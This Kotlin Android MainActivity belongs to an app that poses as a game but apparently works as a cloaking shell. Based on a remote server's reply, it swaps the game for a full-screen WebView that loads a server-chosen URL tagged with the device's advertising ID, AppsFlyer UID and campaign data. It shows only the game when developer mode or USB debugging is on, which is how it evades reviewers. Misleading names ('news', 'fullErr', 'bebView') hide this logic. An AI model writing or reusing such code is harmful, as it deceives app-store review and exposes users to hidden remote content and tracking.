package com.hsr.bkm.mobile

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.webkit.WebChromeClient
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.Input
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import com.hsr.bkm.mobile.bebView.BebViewController
import com.hsr.bkm.mobile.bebView.BebViewChromeClient
import com.hsr.bkm.mobile.databinding.ActivityMainBinding
import com.hsr.bkm.mobile.game.game
import com.hsr.bkm.mobile.game.screens.isGame
import com.hsr.bkm.mobile.game.screens.news
import com.hsr.bkm.mobile.game.utils.Completer
import com.hsr.bkm.mobile.util.*
import com.hsr.bkm.mobile.util.data.NewsObject
import com.hsr.bkm.mobile.util.manager.DataStoreManager
import com.hsr.bkm.mobile.util.network.NetworkUtil
import com.hsr.bkm.mobile.util.network.haveNetworkConnection
import kotlinx.coroutines.withContext
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {

        @SuppressLint("StaticFieldLeak")
        lateinit var binding: ActivityMainBinding

        val bebView by lazy { binding.webView }
        val lottie  by lazy { LottieUtil(binding) }

        val isBebViewVisibleFlow = MutableStateFlow<Boolean?>(null)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (haveNetworkConnection().not()) lottie.showNotNetwork()
        else {
            lottie.showLoader()

            BebViewController(this@MainActivity, bebView).initialize()

            checkDataStore()

            coroutine.launch(Dispatchers.Main) {
                isBebViewVisibleFlow.collect { it?.let { isBebViewVisible ->
                    binding.gameContainer.visibility = View.VISIBLE

                    requestedOrientation = if (isBebViewVisible) {
                        bebView.visibility = View.VISIBLE
                        window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                        ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    } else {
                        bebView.visibility = View.GONE
                        window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                        ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                    }
                } }
            }
        }
    }

    override fun onResume() {
        bebView.onResume()
        super.onResume()
    }

    override fun onPause() {
        bebView.onPause()
        super.onPause()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == BebViewChromeClient.REQUEST_SELECT_FILE) {
            if (BebViewChromeClient.uploadMessage == null) return
            BebViewChromeClient.uploadMessage!!.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data))
            BebViewChromeClient.uploadMessage = null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onBackPressed() {
        if (bebView.canGoBack()) bebView.goBack() else game.screen?.keyDown(Input.Keys.BACK)
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            val newsObj = NetworkUtil.service.getJsonByUrl("https://hsbk-news.com/?category=general")
            news = newsObj.news ?: listOf()

            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Good | link = $it")
                        BebViewController.bebUrlFlow.value = it
                        isBebViewVisibleFlow.value = true
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Bad")
                    isGame = true
                    isBebViewVisibleFlow.value = false
                }
                else   -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) {
                        isGame = true
                        isBebViewVisibleFlow.value = false
                    } else getNews(newsObj)
                }
            }
        }
    }

    private suspend fun getNews(newsObj: NewsObject) {
        log("status = ${newsObj.status} | err = ${newsObj.err}")

        when (newsObj.status) {
            200 -> {
                withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Good" } }
                withContext(Dispatchers.Main) {
                    val completer = Completer(coroutine, 2) {
                        val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                        val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                        val fullErr = newsObj.err + "?" +
                                "apps_uid=${advertisingId}&" +
                                "ads_id=${appsflyerUID}&" +
                                "data_cmpg=${AppsflyerUtil.campaignFlow.value}&" +
                                "data_fb=${FacebookUtil.deeplinkFlow.value}"

                        log("fullErr = $fullErr")

                        BebViewController.bebUrlFlow.value = fullErr
                        isBebViewVisibleFlow.value = true
                        lottie.hideLoader()

                        coroutine.launch(Dispatchers.IO) { DataStoreManager.Link.update { fullErr } }
                    }

                    AppsflyerUtil.initialize(this@MainActivity)
                    coroutine.launch {
                        AppsflyerUtil.campaignFlow.collect {
                            log("campaignFlow = $it")
                            if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                        }
                    }

                    FacebookUtil.initialize()
                    coroutine.launch {
                        FacebookUtil.deeplinkFlow.collect {
                            log("deeplinkFlow = $it")
                            if (it != FacebookUtil.DEEPLINK_INIT_VALUE) completer.complete()
                        }
                    }
                }
            }
            400 -> {
                withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
                isGame = true
                isBebViewVisibleFlow.value = false
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN)
    fun isDevMode(context: Context): Boolean {
        return when {
            Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN  -> {
                Settings.Secure.getInt(context.contentResolver,
                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
            }
            Build.VERSION.SDK_INT == Build.VERSION_CODES.JELLY_BEAN -> {
                @Suppress("DEPRECATION")
                Settings.Secure.getInt(context.contentResolver,
                    Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
            }
            else                                                    -> false
        }
    }

    fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0

}